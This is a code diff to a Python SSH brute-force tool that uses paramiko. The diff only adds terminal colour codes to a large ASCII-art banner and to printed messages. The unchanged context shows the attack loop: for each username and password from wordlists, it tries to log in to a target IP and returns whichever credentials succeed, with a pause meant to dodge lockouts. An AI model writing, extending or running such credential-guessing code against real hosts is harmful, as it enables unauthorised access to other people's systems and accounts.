@@ -2,7 +2,7 @@ import paramiko
 import time
 import argparse
 
-print("""
+print("""\033[96m
 
 ###################sreeraj#############################sreeraj#####################################################
 ########sreeraj#####################sreeraj###################################################sreeraj##############
@@ -20,10 +20,10 @@ print("""
 
 ######################sreeraj#######################################sreeraj#######################################
 ##########sreeraj######################sreeraj############################################sreeraj#################
-######################sreeraj#############################sreeraj#################################################
+######################sreeraj#############################sreeraj#################################################\033[0m
 
 \n
-
+\033[92m
 **********************************************************************
 \n
 * copyright of Sreeraj,2024                                          *\n
@@ -34,7 +34,7 @@ print("""
 **********************************************************************
 \n
 
-   """)
+   \033[0m""")
 print("\n");
 
 
@@ -58,21 +58,21 @@ def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
         username = username.strip()
         for password in passwords:
             password = password.strip()
-            print(f"Trying username: {username}, password: {password}")
+            print(f"\033[94mTrying username: {username}, password: {password}\033[0m")
 
             try:
                 client.connect(target_ip, username=username, password=password, timeout=1)
-                print(f"Success! Username: {username}, Password: {password}")
+                print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                 return username, password
             except paramiko.AuthenticationException:
-                print("Incorrect credentials.")
+                print("\033[31mIncorrect credentials.\033[0m")
             except paramiko.SSHException as e:
-                print(f"Connection error: {e}")
+                print(f"\033[31mConnection error: {e}\033[0m")
                 time.sleep(1)  # Pause to avoid lockouts on too many attempts
             finally:
                 client.close()
 
-    print("No valid username/password combination found in the wordlists.")
+    print("\033[93mNo valid username/password combination found in the wordlists.\033[0m")
     return None
 
 def main():
